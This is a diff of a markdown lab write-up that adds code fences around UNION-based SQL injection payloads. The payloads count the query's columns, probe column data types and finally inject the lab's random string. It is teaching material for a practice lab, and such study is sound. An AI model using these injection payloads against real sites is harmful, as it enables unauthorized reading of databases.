@@ -50,7 +50,9 @@ We need a baseline request to determine where to inject our payload in the `cate
 
 Payload used:
 
+```
 +UNION+SELECT+NULL--
+```
 
 This throws an error.
 
@@ -65,7 +67,9 @@ The original query has more than 1 column, so the UNION fails.
 
 Payload:
 
+```
 +UNION+SELECT+NULL,NULL--
+```
 
 Still an error.
 
@@ -80,7 +84,9 @@ The backend query returns more than 2 columns.
 
 Working payload:
 
+```
 +UNION+SELECT+NULL,NULL,NULL--
+```
 
 The page responds successfully and you see:
 
@@ -98,7 +104,9 @@ We now proceed to test **data types**.
 
 Payload:
 
+```
 +UNION+SELECT+'a',NULL,NULL--
+```
 
 This gives a 500 error.
 
@@ -113,7 +121,9 @@ Column 1 does **not** support string data.
 
 Payload:
 
+```
 +UNION+SELECT+NULL,'a',NULL--
+```
 
 The page renders cleanly.
 
@@ -129,7 +139,9 @@ This is where we place the lab’s random string.
 
 Final payload:
 
+```
 +UNION+SELECT+NULL,'UeOiqY',NULL--
+```
 
 You now see the string appear directly in the page output → **Lab Solved**.
 
